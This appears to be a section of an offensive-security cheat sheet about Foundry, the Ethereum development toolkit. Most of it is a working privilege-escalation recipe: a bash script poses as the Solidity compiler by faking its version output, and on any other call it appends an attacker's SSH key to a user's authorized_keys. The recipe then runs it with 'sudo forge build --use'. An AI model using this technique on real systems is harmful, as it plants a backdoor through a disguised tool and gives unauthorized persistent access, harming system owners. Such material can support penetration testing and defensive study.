# Blockchain

- [Resources](#resources)

## Table of Contents

- [Foundry](#foundry)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Foundry | Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust. | https://github.com/foundry-rs/foundry |

## Foundry

### Malicious Forge Project

#### Create Project

```c
$ forge init /PATH/TO/FOLDER/<FOLDER> --no-git --offline
```

#### Malicious Solidity Compiler (solc)

```c
#!/bin/bash
if [[ $1 == "--version" ]]; then
    echo "solc, the solidity compiler"
    echo "Version: 0.8.17+commit.8df45f5f.Linux.g++"
else
    mkdir -p /home/<USERNAME>/.ssh
    echo "<SSH_KEY>" >> /home/<USERNAME>/.ssh/authorized_keys
    chmod 700 /home/<USERNAME>/.ssh
    chmod 600 /home/<USERNAME>/.ssh/authorized_keys
fi
```

#### Set Permission

```c
$ chmod 777 solc
```

#### Execution

```c
$ sudo forge build --use /PATH/TO/FILE/solc
```
